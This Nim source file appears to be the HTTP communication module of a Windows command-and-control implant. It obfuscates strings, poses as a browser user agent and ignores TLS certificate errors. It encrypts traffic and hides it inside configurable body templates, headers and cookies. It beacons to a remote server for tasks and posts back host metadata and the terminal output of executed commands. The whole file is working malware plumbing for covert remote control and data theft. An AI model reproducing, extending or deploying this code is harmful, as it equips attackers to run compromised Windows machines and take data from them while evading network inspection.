import std/json as jsonmod
import std/strutils
import std/tables
import ../global
import ../general/metadata
import ../general/strings
import ../crypt/transport
import ../tasks/buffer
import ../winapi/handlers
import ../winapi/utils

type UrlParts* = object
  scheme*: string
  host*: string
  port*: int
  path*: string
  secure*: bool

type HttpResponse* = object
  ok*: bool
  code*: uint16
  body*: string

const contentMarker* = obf("§content§")

# Check size cap > OOM ====================================================
proc httpResponseBodyWithinLimit(contentLength: int; bodyLen: int): bool =
  # Checks that the response body stays within the size cap
  const maxHttpRespBody = int(tasks_buffer_max)
  if contentLength >= 0 and contentLength > maxHttpRespBody:
    return false
  bodyLen <= maxHttpRespBody
# =========================================================================

proc parseUrl*(raw: string): UrlParts =
  # Parses the raw url into scheme, host, port, and path
  result = UrlParts(scheme: "", host: "", port: 0, path: "/", secure: false)
  if raw.len == 0:
    return
  var rest = raw
  let lower = raw.toLowerAscii()
  if lower.startsWith("https://"):
    result.scheme = "https"
    result.secure = true
    result.port = 443
    rest = raw[8 ..^ 1]
  elif lower.startsWith("http://"):
    result.scheme = "http"
    result.port = 80
    rest = raw[7 ..^ 1]
  else:
    return
  let slashPos = rest.find('/')
  let authority = if slashPos >= 0: rest[0 ..< slashPos] else: rest
  if slashPos >= 0:
    result.path = rest[slashPos ..^ 1]
  else:
    result.path = "/"
  let colonPos = authority.find(':')
  if colonPos >= 0:
    result.host = authority[0 ..< colonPos]
    var p = 0
    for c in authority[colonPos + 1 ..^ 1]:
      if c < '0' or c > '9':
        return
      p = p * 10 + ord(c) - ord('0')
    if p > 0 and p <= 65535:
      result.port = p
  else:
    result.host = authority

proc toWideZ(s: string): seq[uint16] =
  # Converts a string into a wide null terminated buffer
  result = newSeq[uint16](s.len + 1)
  for i, c in s:
    result[i] = uint16(c)
  result[s.len] = 0

proc buildHeaderBlock(pairs: openArray[(string, string)]): string =
  # Builds the header block from key and value pairs
  for (k, v) in pairs:
    result &= k & ": " & v & "\r\n"

proc winHttpPerform*(
    urlStr: string;
    verb: string;
    body: string;
    extraHeaders: openArray[(string, string)];
): tuple[ok: bool, code: uint16, body: string] =
  # Sends the http request through the windows http api and reads the response
  result = (ok: false, code: 0'u16, body: "")
  let parts = parseUrl(urlStr)
  if parts.scheme.len == 0 or parts.host.len == 0:
    return
  let agent = obf("Mozilla/5.0")
  let wAgent = toWideZ(agent)
  let hSession = winHttpOpen(
    cast[pointer](unsafeAddr wAgent[0]),
    winhttpAccessAutomaticProxy, nil, nil, 0)
  if hSession == nil:
    return
  defer: discard winHttpCloseHandle(hSession)
  let wHost = toWideZ(parts.host)
  let hConnect = winHttpConnect(
    hSession, cast[pointer](unsafeAddr wHost[0]), uint16(parts.port), 0)
  if hConnect == nil:
    return
  defer: discard winHttpCloseHandle(hConnect)
  var reqFlags = culong(0)
  if parts.secure:
    reqFlags = winhttpFlagSecure
  let wVerb = toWideZ(verb.toUpperAscii())
  let wPath = toWideZ(parts.path)
  let wAccept = toWideZ("*/*")
  var acceptTypes = [cast[pointer](unsafeAddr wAccept[0]), nil]
  let hRequest = winHttpOpenRequest(
    hConnect,
    cast[pointer](unsafeAddr wVerb[0]),
    cast[pointer](unsafeAddr wPath[0]),
    nil, nil, cast[pointer](addr acceptTypes[0]), reqFlags)
  if hRequest == nil:
    return
  defer: discard winHttpCloseHandle(hRequest)
  if parts.secure:
    var flags = securityFlagIgnoreUnknownCa or
      securityFlagIgnoreCertWrongUsage or
      securityFlagIgnoreCertCnInvalid or
      securityFlagIgnoreCertDateInvalid
    discard winHttpSetOption(
      hRequest, winhttpOptionSecurityFlags, addr flags, culong(sizeof(flags)))
  let headerBlock = buildHeaderBlock(extraHeaders)
  var wHeaders: seq[uint16] = @[]
  var hPtr: pointer = nil
  var hLen = culong(0)
  if headerBlock.len > 0:
    wHeaders = toWideZ(headerBlock)
    hPtr = cast[pointer](unsafeAddr wHeaders[0])
    hLen = culong(0xFFFFFFFF)
  var bodyPtr: pointer = nil
  var bodyLen = culong(0)
  if body.len > 0:
    bodyPtr = cast[pointer](unsafeAddr body[0])
    bodyLen = culong(body.len)
  if winHttpSendRequest(hRequest, hPtr, hLen, bodyPtr, bodyLen, bodyLen, 0) == 0:
    return
  if winHttpReceiveResponse(hRequest, nil) == 0:
    return
  var status: culong = 0
  var sz = culong(sizeof(culong))
  if winHttpQueryHeaders(
      hRequest,
      winhttpQueryStatusCode or winhttpQueryFlagNumber,
      nil, addr status, addr sz, nil) == 0:
    return
  result.code = uint16(status)
  const maxHttpRespBody = int(tasks_buffer_max)
  var contentLen = -1
  var wideLen = newSeq[uint16](32)
  var lenSz = culong(wideLen.len * sizeof(uint16))
  var lenIdx: culong = 0
  if winHttpQueryHeaders(
      hRequest, winhttpQueryContentLength, nil, addr wideLen[0], addr lenSz, addr lenIdx) != 0:
    var n = 0
    var okLen = true
    var i = 0
    while i < wideLen.len and wideLen[i] != 0:
      let c = char(wideLen[i] and 0xFF)
      if c < '0' or c > '9':
        okLen = false
        break
      n = n * 10 + ord(c) - ord('0')
      inc i
    if okLen and i > 0:
      contentLen = n
  if contentLen > maxHttpRespBody:
    return
  if contentLen > 0:
    var buf = newString(contentLen)
    var total = 0
    while total < contentLen:
      var bytesRead: culong = 0
      if winHttpReadData(
          hRequest, addr buf[total], culong(contentLen - total), addr bytesRead) == 0:
        return
      if bytesRead == 0:
        break
      total += int(bytesRead)
    if total != contentLen:
      return
    result.body = move(buf)
    result.ok = true
    return
  var buf = newString(8192)
  var total = 0
  while true:
    var bytesRead = culong(0)
    if winHttpReadData(hRequest, addr buf[total], culong(buf.len - total), addr bytesRead) == 0:
      return
    total += int(bytesRead)
    if bytesRead == 0:
      break
    if total > maxHttpRespBody:
      return
    if total == buf.len:
      if buf.len >= maxHttpRespBody:
        return
      let newLen = min(buf.len * 2, maxHttpRespBody + 1)
      if newLen <= buf.len:
        return
      buf.setLen(newLen)
  if not httpResponseBodyWithinLimit(-1, total):
    return
  buf.setLen(total)
  result.body = move(buf)
  result.ok = true

proc bodyTemplate(): string =
  # Returns the body template used to wrap the payload
  if customCommunication != contentMarker:
    return customCommunication
  for key, value in tables.pairs(bodyContent):
    if key == "template":
      return value
  contentMarker

proc extractFromTemplate*(raw, tpl: string): string =
  # Extracts the payload that sits between the template markers
  let tpl = tpl.strip()
  if tpl.len == 0 or tpl == contentMarker:
    return raw
  let parts = tpl.split(contentMarker)
  if parts.len < 2:
    return ""
  var pos = 0
  for i in 0 ..< parts.len - 1:
    let prefix = parts[i]
    let suffix = parts[i + 1]
    if prefix.len > 0:
      let p = raw.find(prefix, pos)
      if p < 0:
        return ""
      pos = p + prefix.len
    var endPos = raw.len
    if suffix.len > 0:
      let s = raw.find(suffix, pos)
      if s < 0:
        return ""
      endPos = s
    if i == parts.len - 2:
      return raw[pos ..< endPos]
    pos = endPos + suffix.len
  return ""

proc extractResponsePayload*(raw: sink string): string =
  # Extracts the response payload from the raw body
  if customCommunication == contentMarker:
    return raw
  extractFromTemplate(raw, serverResponseTemplate)

proc buildHeaders(): seq[(string, string)] =
  # Builds the request headers, including cookies
  result = @[(obf("Connection"), obf("close"))]
  for key, value in tables.pairs(customHeaders):
    result.add((key, value))
  var cookies: seq[string] = @[]
  for key, value in tables.pairs(customCookies):
    cookies.add key & obf("=") & value
  if cookies.len > 0:
    result.add((obf("Cookie"), cookies.join(obf("; "))))

proc buildWirePayload(plain: string): string =
  # Encrypts the plain payload and wraps it in the body template
  let encrypted = cryptEncryptWithProbe(aesKey, plain)
  if encrypted.len <= AesProbeWireLen:
    return ""
  let tpl = bodyTemplate()
  if tpl == contentMarker:
    return encrypted
  return tpl.replace(contentMarker, encrypted)

proc baseUrl(): string =
  # Builds the base url from host, port, path, and channel
  let p = parsePortDigits(port)
  if p == 0: return ""
  let scheme = if channel == obf("https"): obf("https://") else: obf("http://")
  scheme & host & obf(":") & port & path

proc exchangeUrl(url: string; isPost: bool; payload: string): HttpResponse =
  # Sends a get or post to the given url and decrypts the response
  if url.len == 0: return HttpResponse()
  var wire = payload
  var headers = buildHeaders()
  if isPost:
    if payload.len > 0:
      wire = buildWirePayload(payload)
      if wire.len == 0:
        return HttpResponse()
      var hasContentType = false
      for (k, _) in headers:
        if k.toLowerAscii() == "content-type":
          hasContentType = true
          break
      if not hasContentType:
        headers.add((obf("Content-Type"), obf("application/octet-stream")))
    var r = winHttpPerform(url, "POST", wire, headers)
    if not r.ok:
      return HttpResponse()
    var responseBody = move(r.body)
    if not httpResponseBodyWithinLimit(-1, responseBody.len):
      return HttpResponse()
    responseBody = extractResponsePayload(move(responseBody))
    responseBody = tryCryptDecrypt(aesKey, move(responseBody))
    return HttpResponse(ok: true, code: r.code, body: responseBody)
  else:
    var r = winHttpPerform(url, "GET", "", headers)
    if not r.ok:
      return HttpResponse()
    var responseBody = move(r.body)
    if not httpResponseBodyWithinLimit(-1, responseBody.len):
      return HttpResponse()
    responseBody = extractResponsePayload(move(responseBody))
    responseBody = tryCryptDecrypt(aesKey, move(responseBody))
    return HttpResponse(ok: true, code: r.code, body: responseBody)

proc exchange(isPost: bool; payload: string): HttpResponse =
  # Runs the exchange against the base url
  exchangeUrl(baseUrl(), isPost, payload)

proc httpGet*(): HttpResponse =
  # Sends an empty get request
  exchange(false, "")

proc httpPost*(body: string): HttpResponse =
  # Sends a post request with the given body
  exchange(true, body)

proc relay_call*(payload: string): HttpResponse =
  # Posts the relay payload
  httpPost(payload)

proc relay_call_url*(url: string; payload: string): HttpResponse =
  # Posts the relay payload to the given url
  exchangeUrl(url, true, payload)

proc httpPostUrl*(url, body: string): HttpResponse =
  # Posts the body to the given url
  exchangeUrl(url, true, body)

proc sendRequest*(tag: string): HttpResponse =
  # Builds the input request with metadata and sends it
  var payload = %*{obf("option"): obf("input"), obf("host"): tag}
  payload[obf("metadata")] = createMetadata()
  exchange(true, $(payload))

proc sendOutput*(taskTag, output: string): HttpResponse =
  # Sends the terminal output for the given task tag
  let payload = $(%*{
    obf("option"): obf("output"),
    obf("type"): obf("terminal"),
    obf("task_tag"): taskTag,
    obf("output"): output,
  })
  exchange(true, payload)

proc sendBatch*(payload: string): HttpResponse =
  # Attaches metadata to each batch item and sends the batch
  if payload.len <= 2 or payload == obf("[]"): return HttpResponse()
  try:
    let batch = jsonmod.parseJson(payload)
    if batch.kind == jsonmod.JArray:
      let meta = createMetadata()
      for item in batch:
        if item.kind == jsonmod.JObject:
          item[obf("metadata")] = meta
      return exchange(true, $(batch))
  except jsonmod.JsonParsingError:
    discard
  exchange(true, payload)
